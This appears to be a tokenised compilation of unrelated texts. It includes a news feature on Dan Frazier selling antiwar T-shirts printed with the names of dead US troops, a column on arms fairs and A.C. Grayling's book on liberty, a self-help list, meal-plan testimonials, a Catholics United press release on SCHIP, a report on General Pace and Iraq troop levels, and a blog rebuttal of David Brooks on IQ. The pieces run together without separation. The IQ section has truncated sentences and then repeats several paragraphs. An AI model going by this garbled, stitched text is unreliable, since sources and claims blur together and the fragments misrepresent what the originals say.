He designed one in 2003 that listed the names of troops -- about 500 then -- who had been killed in the Iraq war .
The phrase “ Bush Lied ” was superimposed over the names .
As the casualty count grew , the bumper sticker became a T - shirt , and Frazier added the words “ They Died . ”
The venture started out as a way to pay the rent , but it landed Frazier in the middle of a fight over what is free speech versus what is exploitation of the dead .

Frazier says that he has an inherent right to use the names and that he ’s not ascribing any political belief to anyone .
“ The shirt does n’t say these people opposed the war .
Just that they died , ” he said .
Some parents say their children would not want their names used this way .
When they asked Frazier to remove the names from the shirts and he refused , the families turned to their elected officials .
Five states -- Arizona , Louisiana , Texas , Oklahoma and Florida -- have since passed laws requiring permission from members of the military or their next of kin before their names can be used commercially .
A version of the law has been introduced in each chamber of Congress .
After Arizona ’s Legislature unanimously passed its statute in May , Frazier said , he had to find a new printer because his first one feared breaking the law .
Frazier has received so many irate calls he is afraid to answer his phone , and he believes someone has been watching his apartment .

“ A lot of those soldiers died thinking they were fighting for American values like freedom of speech , and now their loved ones want to take that right away , ” said Frazier , 42 .
The parents say it ’s a matter of respect .
Margy Bons argued furiously with her son Michael Marzano about the war .
He was so gung - ho to go to Iraq that he hunted for and joined a Reserve unit that was scheduled to quickly deploy .
Marzano , a sergeant in the Marines , was killed in 2005 -- by a suicide bomber in northern Iraq -- just weeks after writing to his mother in Phoenix that he remained convinced he was “ doing the right thing . ”
“ Do you believe anyone who wrote that would want his name on this T - shirt ? ” Bons asked .
“ Do I believe in this war ?
No .
But my son did .
And that ’s whose name I have to protect . ”

Robert Vandertulip of Irving , Texas , had also demanded that Frazier remove the name of his son , Army Spc. Josiah Vandertulip , who was killed by a sniper in Baghdad in 2004 .
“ From the time that they ’re born , your main concern is trying to make sure they ’re protected , ” he said .
“ It does not end when they have died . ”
The son of a newspaper executive , Frazier moved constantly as a child .
He wanted to be a movie director and studied film production at UCLA , but he ended up working for a videotape editing company , then a business that sold Super 8 film equipment .
In 1992 , realizing that his Hollywood dreams were out of reach , he left Los Angeles for Arizona .
For several years he lived in a tent in the woods outside Flagstaff while working odd jobs .
He attended a conservative church and freelanced articles such as one on the odds of a woman meeting a good Christian man .
But he began to question his religious beliefs as he spent more time in this mountain city .
Advertisement
Eventually he married a writer and liberal activist here .
The couple got rid of the tent , rented an apartment and founded a progressive weekly newspaper .
They refused to take ads from any non-locally owned business and depended on donations from readers .
It folded after two years .
“ We pioneered our way right into the ground , ” Frazier joked .
With the newspaper gone , Frazier experimented with another moneymaking venture :
He had found plastic wheels to replace the ones on his office chair , so it could glide easily on carpeting .
He began to distribute the wheels over the Internet .
That was 2002 , and there was growing anger with the Bush administration and the buildup to the Iraq war .
Frazier saw opportunity in selling bumper stickers .
So a year later , he began producing the one with names of the war dead .
“ I got on the bandwagon just as it started going , ” he said .
Advertisement
By May 2005 , the number of U.S. troops dead reached 1,600 .
He started printing the T - shirts .
Sales were slow .
Frazier cut the price from $ 18 to $ 10 .
Parents who were Googling their children ’s names saw what Frazier was selling .
He turned down their requests to stop making the shirts and thought that was the end of it .
Last year he heard from a reporter writing an article about a new law in Oklahoma -- the first in the nation -- that had been prompted by his shirts .
As other states considered adopting similar laws , the publicity drove up sales .
Frazier posted ads on liberal blogs boasting : “ Our antiwar shirts are illegal . ”
He raised the price to $ 22 .
He figures he ’s sold more than 3,000 T - shirts -- printed with the names of 3,461 slain servicemen and - women .
Frazier periodically updates his shirts to include the latest casualties .
There are different versions with catchphrases such as : “ If any question why we died . . . tell them , because our fathers lied . ”
He says he gives $ 1 from each sale to a charity that helps families of those killed .

Frazier makes no apologies for his commercial instincts .
“ I ’m not losing any sleep over the fact that I ’m trying to make a living while doing good , ” he said .
He ’s not exactly prospering .
He and his wife live in a bland apartment complex that would n’t be out of place in Tarzana .
The tidy home shows few signs of Frazier ’s politics .
There ’s a United Nations flag on one wall , a small American flag on a desk stacked with computer books , and a copy of the original “ Bush Lied ” bumper sticker on the fridge .
Copies of the couple ’s 2006 tax return show that Frazier and his wife , who writes about organic food , reported $ 23,500 in adjusted gross income , including $ 497 a friend paid them to use their truck .
Frazier says he expects to make more money this year , though his expenses are rising .
The Arizona law has not slowed Frazier ’s business , and state and local prosecutors have said they do not plan to charge him with any violations .
The American Civil Liberties Union has sued to block the statute .
At a hearing in Phoenix last month , a federal judge said that the law was poorly written and that it did not appear to outlaw Frazier ’s T - shirts .
The judge is expected to issue a formal ruling soon .

Many states , including California , have a “ right of publicity ” that allows people -- especially celebrities -- to control how their names are used .
But those rights cannot stop someone from using names in a political context .
“ My feeling is , because he ’s using the names to make a political statement , it will be trumped by the 1st Amendment , ” said Jennifer Urban , a USC law professor .
“ It ’s obviously a very poignant situation and something that is sad and upsetting to the families .
But in the U.S. , the 1st Amendment is a very robust doctrine , and for good reason . ”
Frazier ’s stand on the shirts has won him admirers .
He also has a reputation in town as a muckraker who has fought against luxury homes springing up on mountainsides and against national chains that have forced out quirky local businesses .
“ Dan is an uncompromising idealist , ” said Bill Buell , 83 , who once faced misdemeanor charges with Frazier for a demonstration at a City Council candidate ’s house .
Frazier insisted on letting the case go to trial , and the protesters were acquitted .

“ He will not back down , ” Buell said .
Margy Bons ’ phone rang at 1:45 a.m. on Mother ’s Day 2005 .
She assumed it was her eldest son calling from Iraq .
Bons grabbed the phone .
“ Hey , sport , ” she said , using Marzano ’s nickname .
On the other end was her ex-husband .
The Marines are at my door , he said .
Our son is dead .

Outside her house on the northern edge of Phoenix , Bons displays a reproduction of a plaque that her son ’s unit made for his headstone .
Framed photos of Marzano in his dress uniform hang above the sofa .
She treasures a thick photo album of his funeral service .
Bons helps run a group that supports families of slain troops .
She heard about her son ’s inclusion on the T - shirt from some of those parents .
She said the shirt ’s existence increased the pain she felt every day .
“ It comes down to treating people right , ” said Bons , who plans to sue Frazier now that the Arizona law is in effect .
“ This is using your political stance and hurting me . ”
Bons is allowing her son ’s name to appear on a memorial to Arizona troops killed in the war because its builders asked for her permission .
She has also agreed to let Marzano ’s name be included in a traveling display of combat boots that symbolize the fallen because the American Friends Service Committee , which conceived the project , had asked beforehand .

Frazier said it ’s impossible for him to seek permission from every relative .
“ I do n’t mean them any disrespect , ” Frazier said .
“ I know they ’re going through hell .
I do n’t want to make it worse .
I want to make it better and stop other families from going through this .
“ To take away the right to use the names , it cripples the antiwar movement .
It takes away one of the most powerful tools we have . ”
Lila Lipscomb of Flint , Mich. , who appeared in Michael Moore ’s 2004 antiwar documentary “ Fahrenheit 9/11 , ” agrees with Frazier ’s opinions of the war .
But she does not tolerate the T - shirt .
“ He ’s doing nothing more than what the president is doing , ” Lipscomb said .
Her son , Army Sgt. Michael Pedersen , was killed when his Black Hawk helicopter was shot down in 2003 .
“ Bush did n’t have the soldiers ’ permission to send them to war .
This guy did n’t have permission to sell my son ’s name . ”

Frazier has also received e-mails from troops asking him not to use their names if they are killed .
“ That ’s really not their prerogative , ” he said .
“ That ’s history ’s domain .
. . .
Imagine what could happen if Holocaust victims ’ names could be erased from walls and memorials . ”

Anyone currently visiting the Royal Docks in London 's East End will see an extraordinary display .
Sleek grey warships nestle close to the vast Excel exhibition of weapons of mass destruction and repression .
Hidden away from the heart of the capital , arms buyers from three dozen nations show why Britain is the world 's second biggest defence exporter after America .
Business is booming again following the post - cold war decline .
Nor is Britain squeamish about what it sells and to whom .
Totalitarian China , Saudi Arabia and Libya are welcomed , their purchases subsidised by the British Treasury if need be .
I am no pacifist and support the right of sovereign peoples to defend themselves , but I can not see how this festival of weaponry meets any foreign policy goal .
It defies Britain 's UN obligation to reduce global militarisation , and aids repressive and undemocratic regimes .
Britain is helping to make the world a more violent place merely because there is money in it , and " if we do n't do it then someone else will " - the smuggler 's defence down the ages .
Governments can think of good reasons for doing anything , but they rarely step back and wonder if they are promoting liberty , or undermining it .
The philosopher AC Grayling is in no doubt of the answer .
He has produced the sort of book that meets Chesterton 's test of " forcing a man to change philosophies and religions " through a sharp blow to the head .
His weapon is history , presented 18th - century style as a sustained tract - Towards the Light : The Story of the Struggles for Liberty & Rights that Made the Modern West .
Grayling argues gloomily that the Whig view of history as a steady progress towards human freedom no longer applies .
It reached its climax in the second half of the 20th century with the defeat of fascism and communism .
We all cheered and declared that history would die .
No chance , says Grayling .
Though much about the world continues to improve - like yesterday 's reported fall in child mortality - " we are beginning to descend the far side of Parnassus " .
Our parents would be amazed that , in peacetime Britain , every public space is monitored by police cameras ; private movement is traceable by satellites that follow cars and phones ; misbehaving citizens can be imprisoned on the say - so of neighbours ; easily readable government ID cards will carry a mass of personal information ; suspects are incarcerated indefinitely without trial ; and torture has returned to the armoury of the state .
They might also find it incredible that 21st - century Britain has revived the 19th - century invasion of distant lands because it dislikes their regimes , or " to spread western values " .
Grayling 's case is that this swelling infringement of personal liberty is not a minor tweaking of law and order but a loss of freedoms that " cost blood and took centuries " to acquire .
They drove Milton to war , Paine to exile and Cobbett to jail .
Thousands were slain , burned or tortured to death in their cause .
Each retreat from such liberty is defended by home secretaries since " the innocent have nothing to fear " .
Tell that to the Britons who were held in Guantánamo , none of whom has ever been charged .
The justification for all this is the threat of attack from religious fanatics .
Yet , as Grayling points out , this is a criminal menace rather than anything on a par with past strategic threats .
While the Islamists may declare their ambition to be a " western caliphate " , this is as ludicrously implausible as the dreams of 19th - century anarchists .
Modern cities are always vulnerable to explosions , but the west is surely robust enough to withstand any serious threat to the character or constitution of its states .
The rantings of Osama bin Laden cannot justify reversing the tide of western liberty .
Indeed , while arming against communism helped defeat communism , arming against terrorism only feeds the beast .
The noblest testament to freedom is the American constitution , yet , as Grayling points out , the latest statute passed under its aegis runs contrary to its ethos .
The mission of the Patriot Act is " to deter and punish terrorist acts in the United States and around the world , to enhance law enforcement investigatory tools , and for other purposes " .
Montesquieu and Madison would have been appalled at such generalised statism .
Nor are the act 's powers temporary , wartime ones ; they are permanent , as are Britain 's myriad terrorism laws .
By extending state power to curb civil liberty they do the terrorist 's job ( such as it is ) for him .
Never was Franklin 's maxim more apt , that he who would put security before liberty deserves neither .
Freedom cannot be strengthened by being weakened .
That is the sophistry of dictatorship .
Commentators have ascribed the chaotically belligerent aftermath of 9/11 to weak western leaders craving popularity in the glamour of war .
Tony Blair said he " believed passionately that we are at mortal risk " from Islamism .
It was the sort of threat that the risk theorist Ulrich Beck describes as " always an elixir to an ailing leader " .
I think more sinister forces are at work : those on display in the Royal Docks .
In 1953 America 's last true soldier / president , Eisenhower , warned of a " military / industrial complex " in danger of running amok .
Its wealth could bend democracy to its will , using paranoia to seize control of budgets and policies alike .
The outcome would be " a tragic waste of resources ... humanity hanging on a cross of iron " , with armies seeking war for their employment .
Elected leaders , said Eisenhower , fed such a complex at their peril .
The growth of Islamist terror , always described as " al - Qaida linked " ( as international crime was always " mafia - linked " ) , meets Eisenhower 's thesis .
With the threat of communism gone , the military / industrial complex needs a new cause .
Allied to a booming police and intelligence bureaucracy , it has grasped eagerly at terrorism .
It has no interest in keeping that threat in proportion , and every interest in exaggerating it .
To cover the bungles that led to 9/11 , this security / industrial complex portrayed the terrorists as awesome and ubiquitous , capable of building vast bomb - proof bunkers in the Hindu Kush , fake plans of which were dumped on a gullible press .
State security agencies dance to the tune of Oh !
What a Lovely War .
They enslave the language of freedom in the cause of repression .
Seen in the light of history , I do not find Grayling 's alarmism out of order .
It is simply true that in Britain and America arms dealers , in league with security bureaucrats , have fuelled public debate with extreme paranoia .
Those who defend liberty are accused of appeasing an unseen enemy .
Those who plead democracy are accused of threatening the state .
If the freedom show is to get back on the road , some battles must clearly be fought over and again .

No matter how motivated , driven or aligned we are , everyone of us goes through a period in our life when we are stuck in a rut .
Here are some of the sure signs your life is stalled :
Your energy drops dramatically
You suddenly become undecided , confused as to your next step
Now , playing the game becomes more important than achieving results
Seemingly overnight you are gaining weight , not sleeping and generally in ill health
And the biggy … you lose hope and stop dreaming about what is possible barely able to make it through what " is "
It can happen without warning to the most optimistic of people .
Suddenly progress slows to a crawl , you get bored , nothing seems to inspire you and the lack of results you are getting can be frustrating .
From the pages of " Achieving Extreme Greatness " –
When your life gets stuck in a rut , here are 10 things you can do to help break the habit …
Convince yourself it will pass .
When you are in a rut it seems that you will never break free , by recognizing that this is simply a phase you are going through , a period that you can change so take the pressure off and change will come faster Exercise .
Even though times like this make any sort of physical exercise even more challenging , you must break free and focus on at least low - grade exercise such as a walk , jog or swim Get social .
We tend to become withdrawn in the low points of our life , a better approach is to join a new sport , hobby , fitness class , support group or other social activity where you can be with others Change your diet .
We tend to become self - destructive in times of trouble within our lives – eating too much sugar and carbohydrates , escaping reality with alcohol and stimulants – by breaking these bad habits we can build momentum that will break out of our rut Change your routine .
Being stuck in a rut is really succumbing to a pattern of bad habits – by breaking your routine , just one step toward change can get the ball rolling Baby steps .
Our tendancy is to wait for some major life event to break us out of our rut when the best way to quickly escape this hell - like , self - imposed prison is to take small steps each day toward improving our life Change your company .
There are times in my life where I was kept in a rut largely by the negative energy of the people around me .
When you are stuck in life look around you , do you have positive role models or mentors you can rely on to help you see the light ?
Step Up – Take Responsibility .
Look inward and understand that you have everything you need to succeed wildly today , it 's just that you are relying on external factors for your success .
By taking responsibility for changing your situation you empower yourself to break free of your rut .
Introspection and Meditation .
When things around you get so heavy , so meaningless and challenging – give yourself permission to focus inward for 30 - minutes each day by practicing yoga and meditation .
With just a week of consistent meditation you will be amazed at how less terrible you will feel about your current rut Know the signs .
Take stock each day of your feelings , your accomplishments and how well aligned your actions are with your inner purpose and desire .
Recognize how you feel and how you respond when under pressure , out of control and out of alignment .
If you can identify these characteristics early you can take control before you get stuck in a rut
There is no reason to spend another day stuck in a rut .
Use these 10 techniques to break free and begin living life the way you really want to once again .
OMG !
Loving that this program has made it so easy .
No more pondering for hours what to have the following week ...
[ Also ] LOVE the new format !
Thank you for including the prep and cook times .
Thank you for the opportunity to provide quick , healthy meals for my family ....
I really like how the shopping list notes the recipe number after the ingredients .
That made it very easy to know which items I needed to buy for the recipes that I had chosen . "
Not all the pressure is from the usual sources .
From a press release yesterday :
Ad Campaign Criticizes Pro-Life Members of Congress for Voting against Children 's Health Insurance
Washington , DC - Catholics
United will launch a radio advertising campaign targeting ten members of Congress whose opposition to the State Children 's Health Insurance Program ( SCHIP ) have compromised their pro-life voting records .
The ads , which feature a mother urging her Congressional Representative to support SCHIP , will primarily air on Christian and talk radio stations from Monday Oct. 15 to Wednesday , Oct. 17 as Congress approaches a critical Oct. 18 vote to override President Bush 's veto of bipartisan SCHIP legislation .
" Building a true culture of life requires public policies that promote the welfare of the most vulnerable , " said Chris Korzen , executive director of Catholics United .
" At the heart of the Christian faith is a deep and abiding concern for the need of others .
Pro-life Christians who serve in Congress should honor this commitment by supporting health care for poor children . "
The following members of Congress have voted against SCHIP , which provides high - quality health coverage to more than six million children whose families would otherwise be unable to afford insurance .
Radio ads will air on local radio stations in their congressional districts .
Rep. Ginny Brown - Waite , Florida
Rep. Joseph Knollenberg , Michigan
Rep. Thaddeus McCotter , Michigan ,
Rep. Tim Walberg , Michigan
Rep. Steve Chabot , Ohio
Rep. Gene Taylor , Mississippi
Rep. Michelle Bachmann , Minnesota
Rep. Sam Graves , Missouri
Rep. Thelma Drake , Virginia
Rep. John Peterson , Pennsylvania
The script for the radio commercial reads : " I 'm the mother of three children , and I 'm pro-life .
I believe that protecting the lives our children must be our nation 's number one moral priority .
That 's why I 'm concerned that Congressman X says he 's pro-life but votes against health care for poor children .
That 's not pro-life .
That 's not pro-family .
Tell Congressman
X to vote for health care for children .
Call him today at XXXX , that 's XXXXX . "
The U.S. Conference of Catholic Bishops , Catholic Charities USA , and the Catholic Health Association have all urged Congress and President Bush to support SCHIP .
The chairman of the Joint Chiefs of Staff is expected to advise President Bush to reduce the U.S. force in Iraq next year by almost half , potentially creating a rift with top White House officials and other military commanders over the course of the war .
Administration and military officials say Marine Gen. Peter Pace is likely to convey concerns by the Joint Chiefs that keeping well in excess of 100,000 troops in Iraq through 2008 will severely strain the military .
This assessment could collide with one being prepared by the U.S. commander in Iraq , Army Gen. David H. Petraeus , calling for the U.S. to maintain higher troop levels for 2008 and beyond .
Petraeus is expected to support a White House view that the absence of widespread political progress in Iraq requires several more months of the U.S. troop buildup before force levels are decreased to their pre-buildup numbers sometime next year .
Pace ’s recommendations reflect the views of the Joint Chiefs of Staff , who initially expressed private skepticism about the strategy ordered by Bush and directed by Petraeus , before publicly backing it .

According to administration and military officials , the Joint Chiefs believe it is of crucial strategic importance to reduce the size of the U.S. force in Iraq in order to bolster the military ’s ability to respond to other threats , a view that is shared by Defense Secretary Robert M. Gates .
Pace is expected to offer his advice privately instead of issuing a formal report .
Still , the position of Pace and the Joint Chiefs could add weight to that of Bush administration critics , including Democratic presidential candidates , that the U.S. force should be reduced .
Those critics include Republican Sen. John W. Warner of Virginia , who on Thursday called on Bush to begin withdrawing troops in September to pressure the Iraqi government to move toward political compromise .
Any discord among the top U.S. generals could be awkward for Bush , who professes to rely heavily on advice from military leaders .
But there also is tremendous pressure for military officers to speak with one voice and defer to Petraeus and other field commanders .
It remains possible that the Joint Chiefs may opt to weaken their stance before approaching Bush .

According to a senior administration official , the Joint Chiefs in recent weeks have pressed concerns that the Iraq war has degraded the U.S. military ’s ability to respond , if needed , to other threats , such as Iran .
The chiefs are pushing for a significant decrease in troop levels once the current buildup comes to an end -- perhaps to about half of the 20 combat brigades now in Iraq .
Along with support units , that would lower the U.S. presence to fewer than 100,000 troops from the current 162,000 .
But military leaders in Iraq , as well as senior officials in the White House , are pushing for troop levels to return to the prior level of about 15 brigades , or about 134,000 troops , once the current buildup is over .
Despite signs of progress in some locales , the Iraqi government has failed at national reconciliation , a new National Intelligence Estimate reported Thursday .
White House policymakers argue that such weakness means they cannot dramatically reduce U.S. troop levels , at least through the end of the Bush presidency .

Bush has said publicly he hopes to move toward troop levels recommended by the blue - ribbon Iraq Study Group , which had called for drastic reductions in combat power to focus on training and counter - terrorism missions .
Such a shift would lead to a force of 20,000 to 50,000 soldiers .
That now appears unlikely .
Planning within the White House has shifted in recent weeks to focus on how large a presence can be maintained in Iraq through the end of 2008 .
“ If it ’s going to take time , and if we ca n’t afford to just walk away from this , then . . . we better get ourselves structured for the long haul , ” said the senior administration official , explaining the White House position .
Administration and defense officials spoke on condition of anonymity because neither the White House nor Pentagon has made any final decisions on Iraq policy .
Advertisement
As the top American combat general , Petraeus wields wide authority and commands considerable attention in Washington .
But U.S. law gives the Joint Chiefs responsibility to ensure the long - term well - being of the military and makes their chairman the president ’s principal military advisor .
“ Petraeus and [ Ambassador to Iraq Ryan ]
Crocker are coming to testify , but this is the president ’s decision , ” said a senior military official in the Pentagon .
“ As the chairman , Gen .
Pace , by law , has a big role in that and he will provide his advice to the president . ”
Pace was not nominated by Bush for a second term as chairman of the Joint Chiefs and will leave the post at the end of September .
He is being succeeded by Adm. Michael G. Mullen , the current Navy chief , who has been even more vocal in his concerns about the stresses on the Army .
Although the role of Defense Department civilian leaders has been highly controversial since the start of the Iraq war , strains between ground commanders and the Pentagon ’s military brass have been comparatively rare .
Previous U.S. commanders in Iraq , such as Petraeus ’ predecessor , Army Gen. George W. Casey Jr. , emphasized low force levels , in part to ensure the overall health of the Army .
Advertisement
Pace has gained a reputation as a consensus builder who is loath to confront civilian leaders on war strategy .
With his term nearly up , he is facing his last opportunity to affect the war effort and is stepping up the involvement of the Joint Chiefs in planning for Iraq .
Pace has assigned a handpicked group of high - ranking Iraq combat veterans , known as his “ council of colonels , ” to help formulate the Pentagon military leadership ’s assessment of current strategy , according to military officials .
Pace created the council last year .
Although the chiefs ’ specific recommendations to Bush were pushed aside then in favor of the troop buildup ordered in January , Pace has asked the council to look at various military problems since then .
The process has been credited with reinvigorating the relevance of the Joint Chiefs .
Membership on the council has shifted since last year , and Pentagon officials say Pace now has a fresh group , convened this summer , examining potential changes to Iraq strategy .
Past council members have included Army Col. Peter R. Mansoor , who is now Petraeus ’ executive officer in Baghdad .
Officials would not identify the officers now on Pace ’s panel .
Advertisement
Senior military officers in Washington believe that by next year , the Iraqi military will be able to shoulder more of the burden now carried by U.S. forces , according to defense officials .
Before the 2006 Samarra mosque bombing touched off cycles of sectarian violence , military officials believed they were on the path to reducing U.S. forces in Iraq to 10 brigades .
Officers in the Pentagon now believe advances in the Iraqi army mean that U.S. and coalition forces may be once again on that path .
“ The 25 - cent question is , ‘ What is the size of the force ? ’
To say there will be a smaller force is not accurate .
There will be a smaller coalition force , but not necessarily a smaller overall force , ” said a senior military officer .
“ The Iraqi security forces are making progress . ”
The Joint Chiefs have become increasingly vocal about the need to keep Army and Marine forces at home longer between deployments so the military can train for other challenges besides the counterinsurgency fight in Iraq .

“ Today ’s Army is out of balance , ” Casey said last week in a speech at the National Press Club .
“ We ’re consumed with meeting the current demands , and we ’re unable to provide ready forces as rapidly as we would like for other contingencies . ”

The Progression of IQ - a response to David Brooks The Progression of IQ - a response to David Brooks
In his September 14 , 2007
A nice phenomenon of the past few years is the diminishing influence of I.Q .
Right out of the block he is off .
In what domain was there once a non -zero IQ - outcome relation , but now , X number of years later , the relation has shown a systematic decrease ?
From the generality of the statement , one would expect this to hold across most , if not all , pertinent domains ( e.g. , occupation , academic success , etc. ) .
However , that is not the case .
Not only do the IQ - achievement , and IQ - occupation relationships still hold , but now there is a burgeoning new field in the area :
For a time , I.Q. was the most reliable method we had to capture mental aptitude .
People had the impression that we are born with these information - processing engines in our heads and that smart people have more horsepower than dumb people .
These two statements have little to do with each other .
IQ ( at least as derived from a Full Scale score ) has been , and still is , very reliable for most age groups and subpopulations , no matter how you measure reliability .
For example , the
The second statement , while perhaps overstated , is true .
People are born with brains , these brains process information , and smarter people ( as measured by IQ scores ) tend to process information faster ( see , for example ,
And in fact , there 's something to that .
There is such a thing as general intelligence ; people who are good at one mental skill tend to be good at others .
This intelligence is partly hereditary .
A meta-analysis by Bernie Devlin of the University of Pittsburgh found that genes account for about 48 percent of the differences in I.Q. scores .
There 's even evidence that people with bigger brains tend to
have higher intelligence .
No disagreement here .
But there has always been something opaque about I.Q .
In the first place , there 's no consensus about what intelligence is .
Some people think intelligence is the ability to adapt to an environment , others that capacity to think abstractly , and so on .
Ah , the slippery slope begins .
These arguments are so old , and well - answered in the literature that it is almost painful to repeat them .
I refer the interested ( and Mr. Brooks ) to
intelligence , but they really are quite different concepts .
Then there are weird patterns .
For example , over the past century , average I.Q. scores have risen at a rate of about 3 to 6 points per decade .
This phenomenon , known as the Flynn effect , has been measured in many countries and across all age groups .
Nobody seems to understand why this happens or why it seems to be petering out in some places , like Scandinavia .
IQ scores , across generations , need re-calibrated for valid comparisons .
We have ways that do this very well (
I.Q. can also be powerfully affected by environment .
As Eric Turkheimer of the University of Virginia and others have shown , growing up in poverty can affect your intelligence for the worse .
Growing up in an emotionally strangled household also affects I.Q.
One of the classic findings of this was made by H.M. Skeels back in the 1930s .
He studied mentally retarded orphans who were put in foster homes .
After four years , their I.Q.'s diverged an amazing 50 points from orphans who were not moved .
And the remarkable thing is the mothers who adopted the orphans were themselves mentally retarded and living in a different institution .
It was n't tutoring that produced the I.Q. spike ; it was love .
Brooks is telling all parents of children who have Mental Retardation or Borderline Intelligence that their children 's low cognitive ability is a direct result of parental inadequacy .
If these parents would love their children more , the Mental Retardation would go away .
If I were king , I would mandate that any person with the gumption to make asinine statements like this do two things ( a ) read Spitz's
By the way ,
Then , finally , there are the various theories of multiple intelligences .
We do n't just have one thing called intelligence .
We have a lot of distinct mental capacities .
These theories thrive , despite resistance from the statisticians , because they explain everyday experience .
I 'm decent at processing words , but when it comes to calculating the caroms on a pool table , I have the aptitude of a sea slug .
What ?
A few paragraphs ago general intelligence existed , now it does n't ?
Anyway , it is an awful shame when everyday experience does not map onto what data tell us :
I.Q. , in other words , is a black box .
It measures something , but it 's not clear what it is or whether it 's good at predicting how people will do in life .
Over the past few years , scientists have opened the black box to investigate the brain itself , not a statistical artifact .
I wish I had the luxury of being able to write blatantly false statements in a national paper .
There is over 100 years of empirical literature investigating the construct validity of IQ .
There is also 100 years of literature examining what , and how well , IQ scores predict life outcomes .
A simple perusing of Jensen's
Now you can read books about mental capacities in which the subject of I.Q. and intelligence barely comes up .
The authors are concerned instead with , say , the parallel processes that compete for attention in the brain , and how they integrate .
They 're discovering that far from being a cold engine for processing information , neural connections are shaped by emotion .
... and you can read books about journalism in which the subject of sophism barely comes up .
Namely because the books are concerned about journalism , not logical arguments .
Why would a cognitive scientist who is writing a book about attention necessarily include a chapter about intelligence ?
As a rule , cognitive scientists tend to be concerned with general processes , not individual differences .
The field can learn much from each other , but they are concerned about very different areas of investigation .
Antonio Damasio of the University of Southern California had a patient rendered emotionless by damage to his frontal lobes .
When asked what day he could come back for an appointment , he stood there for nearly half an hour describing the pros and cons of different dates , but was incapable of making a decision .
This is not the Spock - like brain engine suggested by the I.Q .
By all means , lets infer from one person with severe brain damage to the entire population .
But if we want to play this game , I had a patient once who had just started Kindergarten , but could do addition , subtraction , multiplication and long division ( the latter of which he deduced how to do pretty much on his own ) .
He did not need a school to teach him any of this , so lets get rid of elementary schools for everyone .
After all , if my patient could figure out long division , so should every other 5 year old .
Today , the research that dominates public conversation is not about raw brain power but about the strengths and consequences of specific processes .
Daniel Schacter of Harvard writes about the vices that flow from the way memory works .
Daniel Gilbert , also of Harvard , describes the mistakes people make in perceiving the future .
If people at Harvard are moving beyond general intelligence , you know something big is happening .
Harvard never was a bastion for the study of general intelligence .
It was the University of London .
In fact , except for Yerkes , Herrnstein , and , to some extent , Pinker , I can't think of too many profs .
there who contributed much to the study of general intelligence .
And since when did Harvard 's Psychology department become the measuring stick by which the importance of a research agenda was measured ?
I 'm sure much of the work they do there furthers the general field of psychology , but what makes their research more special than , say , Berkeley , Stanford , UT - Austin , etc . ?
The cultural consequence is that judging intelligence is less like measuring horsepower in an engine and more like watching ballet .
Speed and strength are part of intelligence , and these things can be measured numerically , but the essence of the activity is found in the rhythm and grace and personality — traits that are the products of an idiosyncratic blend of emotions , experiences , motivations and inheritances .
This paragraph is quite confusing , perhaps due to the mixing of automotive and ballet metaphors .
I think Brooks is trying to tell his readers he thinks personality is important for modern culture .
I agree .
And that has absolutely no bearing on the importance ( or lack thereof ) of cognitive ability in the same culture .
Recent brain research , rather than reducing everything to electrical impulses and quantifiable pulses , actually enhances our appreciation of human complexity and richness .
While psychometrics offered the false allure of objective fact , the new science brings us back into contact with literature , history and the humanities , and , ultimately , to the uniqueness of the individual .
What ?
First , psychometrics ( and specifically , the study of cognitive ability ) has always held as paramount the uniqueness of the individual .
Second , how has the study of cognitive ability NOT shown the complexity of humanity ?
Sir Cyril Burt , one of the pioneers in the field , was enamored with the complexity of students he encountered while a school psychologist in London .
In fact , he was such an ardent supporter of psychological measurement so that he could begin to quantify , and , ultimately , understand and predict , this variability ( see a
Despite the sometimes contentious controversy about whether intelligence can or should be measured , the array of neuroimaging studies reviewed here demonstrates that scores on many psychometrically - based measures of intellectual ability have robust correlates in brain structure and function .
Moreover , the consistencies demonstrated among studies further undermine claims that intelligence testing has no empirical basis .
In the world of academia , to have your ideas printed in a reputable journal , you have to go through the peer - review process .
While there are arguments for the pros and cons of this process , at least it frequently squashes ill - informed , blatantly false propaganda from reaching the masses .
After reading op - ed like this , one wishes the NYT had a similar mechanism in place .
Right out of the block he is off .
In what domain was there once a non -zero IQ - outcome relation , but now , X number of years later , the relation has shown a systematic decrease ?
From the generality of the statement , one would expect this to hold across most , if not all , pertinent domains ( e.g. , occupation , academic success , etc. ) .
However , that is not the case .
Not only do the IQ - achievement , and IQ - occupation relationships still hold , but now there is a burgeoning new field in the area : cognitive epidemiology , that looks to see how health outcomes are related to cognitive ability .
Deary et al give a terse summary here , and Gottfredson gives a conceptual overview here .
But , perhaps more interesting , researchers who have no interest in intelligence per se are finding similar results : a case - in - point is Yakov Stern 's cognitive reserve research that shows people with higher IQ scores tend to have have less severe symptoms of Alzheimer 's symptoms .
As this is a new area of inquiry , the exact nature of the relationship has not been identified , but one thing we can say for sure is that there is no diminishing influence of cognitive ability .
These two statements have little to do with each other .
IQ ( at least as derived from a Full Scale score ) has been , and still is , very reliable for most age groups and subpopulations , no matter how you measure reliability .
For example , the Woodcock - Johnson , one of the more theoretically sound measures of cognitive ability , reports in their new normative update that the coefficient alpha values ( which are a lower bound of reliability ) above .90 for all ages ranging from 3 to over 80 .
Given that the maximum value alpha can take is 1 ( under almost all circumstances ) , this is pretty good evidence .
If you look at the technical manual for the Wechsler , Stanford - Binet , or Reynolds Intellectual Assessment Scales , you 'll find very similar values ( I refer to these only because their norms span a very large age group , and the full scale score is derived from multiple subtests ) .
I challenge Mr. Brooks to find a more reliably - measured psychological construct in psychology , nay , in the social sciences .
The second statement , while perhaps overstated , is true .
People are born with brains , these brains process information , and smarter people ( as measured by IQ scores ) tend to process information faster ( see , for example , here and here ) .
What impression should people have instead ?
People are born with a blank slate and all of life is little more that the acquisition of stimulus - response patterns ?
Skinner died in the 1990s , and strict adherence to this view died long before that ( a great book about this ) .
No disagreement here .
Ah , the slippery slope begins .
These arguments are so old , and well - answered in the literature that it is almost painful to repeat them .
I refer the interested ( and Mr. Brooks ) to Seligman 's phenomenal , non-technical introduction , as well as Deary 's brilliant literary corpuscle .
First , IQ and intelligence are two different things .
One is a measuring instrument 's scale and the other is a psychological construct that is measured , to one degree or another , by an IQ test .
We do n't confuse inches and paper , so why do we confuse IQ and intelligence ?
Second , few scholars actually study intelligence .
While the word might be used in common parlance , there is no common definition .
Instead , most serious scholars study general intelligence ( g ) or one of its sub - constructs ( e..g , fluid abilities , crystallized abilities ; see here or here or here ) .
Once you make the jump to g , the definition becomes much more consensual .
There are technical debates ( as there are in any branch of science ) , but it 's measurement ( by factor analysis of one flavor or another ) is virtually undebated .
